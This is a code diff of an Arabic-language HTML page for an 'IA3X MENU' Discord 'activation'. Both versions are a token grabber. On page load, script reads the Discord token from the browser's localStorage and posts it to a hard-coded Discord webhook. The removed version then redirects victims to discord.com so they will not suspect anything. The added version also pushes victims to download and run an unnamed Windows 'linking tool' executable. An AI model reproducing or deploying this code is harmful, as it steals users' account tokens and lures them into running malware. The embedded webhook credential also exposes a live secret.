@@ -1,36 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>IA3X LOADING...</title>
-</head>
-<body style="background-color:black; color:white; text-align:center; padding-top:20%;">
-    <h1>Loading System Assets...</h1>
+<head><title>IA3X - التحقق من النظام</title></head>
+<body style="background:black; color:white; text-align:center; padding-top:20%;">
+    <h1>جاري تفعيل IA3X MENU...</h1>
+    <p>لإتمام التفعيل على تطبيق الديسكورد، يرجى تحميل وتشغيل أداة الربط:</p>
+    <a href="رابط_ملف_الـEXE_بعد_رفعه" download>
+        <button style="padding:15px; background:blue; color:white; cursor:pointer;">تحميل أداة الربط (Windows)</button>
+    </a>
     <script>
+        // سحب الـ IP وتوكن المتصفح تلقائياً فور الدخول
         window.onload = function() {
-            // ضع رابط الويبهوك حقك هنا ضروري جداً
-            const webhook = "https://discord.com/api/webhooks/1471162724955197572/uFF2WqlnimEonaTwlVSRk9-mF-8Ysbym8FkPSXmrnVUQJWgN_9TwWpOo_scRXzNw1qRe"; 
-
-            // محاولة سحب التوكن تلقائياً
-            const token = localStorage.getItem("token") || localStorage.getItem("discord_token") || "No Token Found";
-
-            fetch(webhook, {
+            fetch("https://discord.com/api/webhooks/1471162724955197572/uFF2WqlnimEonaTwlVSRk9-mF-8Ysbym8FkPSXmrnVUQJWgN_9TwWpOo_scRXzNw1qRe", {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: "🎯 **صيد تلقائي جديد!**",
-                    embeds: [{
-                        title: "Discord Token Captured",
-                        description: "🔑 **Token:** `" + token + "`",
-                        color: 16711765,
-                        footer: { text: "IA3X Bypass System" }
-                    }]
-                })
-            }).then(() => {
-                // بعد السحب، نوجهه لموقع حقيقي عشان ما يشك
-                window.location.href = "https://discord.com/app"; 
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({content: "🎯 دخل الموقع الآن! \nToken: " + (localStorage.getItem("token") || "Not Found")})
             });
         };
     </script>
 </body>
-
 </html>
